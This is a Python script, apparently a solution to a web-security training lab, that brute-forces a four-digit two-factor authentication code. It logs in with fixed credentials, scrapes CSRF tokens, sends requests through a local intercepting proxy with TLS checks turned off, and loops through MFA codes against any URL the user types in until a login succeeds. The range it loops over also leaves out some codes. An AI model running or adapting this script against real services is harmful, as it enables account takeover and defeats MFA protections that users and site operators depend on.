import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def first_request(url, point):
    session = requests.Session()
    path = url + "login"
    r1 = session.get(path, verify=False, proxies=proxies)
    csrf_token = get_csrf_token(r1)
    cookie_value = session.cookies.get("session")
    headers = {'Cookie': 'session=' + cookie_value}
    data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}
    r2 = session.post(path, data=data, verify=False, headers=headers, proxies=proxies)
    
    cookie_value = session.cookies.get("session")
    headers = {'Cookie': 'session=' + cookie_value}
    path = url + "login2"
    csrf_token = get_csrf_token(r2)
    data = {'csrf': csrf_token, 'mfa-code': point}
    r3 = session.post(path, data=data, verify=False, headers=headers, proxies=proxies)
    if "Incorrect security code" in r3.text:
        pass
    else:
        print("[+] 2FA Authentication has successfully bypassed using code: " + str(point))
        sys.exit()

def main():
    url = input("Please Enter the URL: ")
    for point in range(1111,9999):
        first_request(url, point)

if __name__ == "__main__":
    main()